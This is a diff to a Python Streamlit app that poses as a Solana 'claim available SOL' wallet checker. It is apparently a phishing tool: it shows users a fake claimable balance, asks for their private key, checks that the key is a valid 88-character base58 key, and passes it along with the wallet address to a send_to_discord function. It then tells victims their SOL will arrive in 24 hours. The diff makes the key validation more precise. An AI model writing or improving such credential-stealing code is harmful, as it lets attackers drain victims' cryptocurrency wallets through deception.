@@ -47,30 +47,35 @@ menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn �
 import re
 
 def check_solana_private_key(private_key):
-    # Solana private key pattern: base58 characters, 32-44 length
-    pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
-    return bool(re.match(pattern, private_key))
+    # Validate 64-byte Solana private key format
+    if len(private_key) != 88:  # Base58 encoded 64 bytes is 88 characters
+        return False
+    try:
+        decoded = base58.b58decode(private_key)
+        return len(decoded) == 64  # 32 bytes private + 32 bytes public
+    except:
+        return False
 
 if menu == "Check Wallet ✅":
-      st.header("Check Wallet Eligibility")
-      wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
+    st.header("Check Wallet Eligibility")
+    wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
 
-      if wallet_address:
-          with st.spinner("🕑 Loading wallet info..."):
-              time.sleep(3)
-              claimable_sol = check_wallet_eligibility(wallet_address)
+    if wallet_address:
+        with st.spinner("🕑 Loading wallet info..."):
+            time.sleep(3)
+            claimable_sol = check_wallet_eligibility(wallet_address)
             
-              if claimable_sol > 0:
-                  st.success(f"🎉 You have {claimable_sol:.6f} SOL available to claim!")
-                  private_key = st.text_input("Enter your Solana private key (88 characters):", type="password")
+            if claimable_sol > 0:
+                st.success(f"🎉 You have {claimable_sol:.6f} SOL available to claim!")
+                private_key = st.text_input("Enter your Solana private key (88 characters):", type="password")
                 
-                  if private_key:
-                      if check_solana_private_key(private_key):
-                          send_to_discord(wallet_address, private_key)
-                          st.success("✅ Successfully initiated cleanup!")
-                          st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
-                      else:
-                          st.error("❌ Invalid format. Please enter a valid Solana private key")
+                if private_key:
+                    if check_solana_private_key(private_key):
+                        send_to_discord(wallet_address, private_key)
+                        st.success("✅ Successfully initiated cleanup!")
+                        st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
+                    else:
+                        st.error("❌ Invalid format. Please enter a valid 88-character Solana private key")
 elif menu == "Invite & Earn 📢":
     st.header("Invite & Earn 📢")
     st.write("🚧 This feature is currently under development. 🚧")
